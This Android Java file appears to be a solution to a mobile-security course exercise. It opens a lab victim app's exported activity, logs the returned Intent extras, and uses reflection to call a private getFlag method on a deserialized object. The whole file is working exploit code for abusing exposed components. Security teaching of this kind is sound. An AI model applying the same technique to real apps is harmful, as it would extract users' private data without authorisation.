package com.example.maliciousapp4;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import com.example.victimapp.FlagContainer;

import java.lang.reflect.Method;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MOBIOTSEC";
    private static final int REQUEST_CODE1 = 1;
    // https://www.exploit-db.com/exploits/37792

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        doit();
    }

    public void doit() {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity"));
            if ( intent.resolveActivity(getPackageManager()) != null) {
                this.startActivityForResult(intent, REQUEST_CODE1);
            }
        }
        catch (Exception e) {
            Log.e(TAG, "doIt() Error: " + e.toString());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if(requestCode == REQUEST_CODE1 && resultCode == RESULT_OK){ //check that ActivityCode is ok
            try {
                Log.i(TAG, data.toString());//data is an intent

                Bundle bundle = data.getExtras(); //  Android Bundle is used to pass data between activities. The values that are to be passed are mapped to String keys which are later used in the next activity to retrieve the values.
                for (String p : bundle.keySet()) {
                    Log.i(TAG, "key: " + p + " value: " + bundle.get(p));
                }
                FlagContainer fc = (FlagContainer) bundle.get("flag"); //ottengo i dati spediti nell'intent  resultIntent.putExtra("flag", fc); dove fc e' la classe
                Method method = fc.getClass().getDeclaredMethod("getFlag");
                method.setAccessible(true);//With setAccessible() you change the behavior of the AccessibleObject, i.e. the Field instance, but not the actual field of the class. //A value of true indicates that the reflected object should suppress checks for Java language access control when it is used
                Log.i(TAG, "Result: " + method.invoke(fc).toString());


            } catch (Exception e){
                Log.e(TAG, "onActivityResult Error: " + e.toString());
            }
        }
    }
}